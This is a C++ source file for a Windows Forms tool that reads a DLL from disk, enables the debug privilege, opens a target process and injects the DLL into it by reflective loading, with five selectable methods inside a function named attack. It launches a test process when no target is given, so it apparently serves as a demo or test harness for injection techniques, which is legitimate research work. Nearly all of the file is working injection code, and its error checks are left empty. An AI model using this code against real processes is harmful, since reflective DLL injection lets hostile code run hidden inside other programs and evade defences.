#include "Form1.h"
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "LoadLibraryR.h"

using namespace CppCLRWinformsProjekt;

static DWORD dwLength = 0;
static LPVOID lpBuffer = NULL;
static const char* exportedFuncName = "ReflectiveLoader";

//////////////////////////////////////////////////////////////////////////////
//Initialize DLL payload.
void init() {
	FILE* fp = NULL;
	TOKEN_PRIVILEGES priv = { 0 };
	HANDLE hToken = NULL;

	const char* cpDllFile = "InjecteeDLL.dll";


	fopen_s(&fp, cpDllFile, "rb");
	if (fp == NULL) {

	}

	fseek(fp, 0L, SEEK_END);
	dwLength = ftell(fp);
	fseek(fp, 0L, SEEK_SET);

	lpBuffer = malloc(dwLength);
	if (lpBuffer == NULL) {

	}

	fread(lpBuffer, 1, dwLength, fp);
	fclose(fp);

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
		{
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
		}

		CloseHandle(hToken);
	}

}

//////////////////////////////////////////////////////////////////////////////
//Free DLL payload.
void exiting() {

	if (lpBuffer)
		free(lpBuffer);

}



void attack(unsigned int pid, unsigned int tid, int method)
{
	HANDLE hFile = NULL;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;


	//////////////////////////////////////////////////////////////////////////////
	// Checking inputs.

	Form1^ form = (Form1^)Application::OpenForms[0];

	if (method == 0) {
		form->set_status("Choose the Attack Option.");
		return;
	}
	else if (pid == 0) {

		STARTUPINFO suinfo = { 0 };
		suinfo.cb = sizeof(STARTUPINFO);
		PROCESS_INFORMATION procinfo;

		CreateProcess(NULL, "TestProcess.exe", NULL, NULL, FALSE, 0, NULL, NULL, &suinfo, &procinfo);

		pid = procinfo.dwProcessId;
		tid = procinfo.dwThreadId;

		form->set_status("Executing TestProcess.exe.");
	}
	else {
		form->set_status("");
	}

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION 
		| PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
	if (hProcess == NULL) {
	
	}


	//////////////////////////////////////////////////////////////////////////////
	// using various method for alternative LoadLibrary API
	switch (method) {
	case 1:
		hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 2:
		hModule = LoadRemoteLibraryR2(hProcess, lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 3:
		if (tid == 0) {
			form->set_status("#3 requires Target TID.");
			break;
		}
		LoadRemoteLibraryR3(hProcess, tid , lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 4:
		if (tid == 0) {
			form->set_status("#4 requires Target TID.");
			break;
		}
		LoadRemoteLibraryR4(hProcess, tid, lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 5:
		LoadRemoteLibraryR5(lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	default:
		break;
	}

	WaitForSingleObject(hModule, -1);

	if (hProcess)
		CloseHandle(hProcess);

}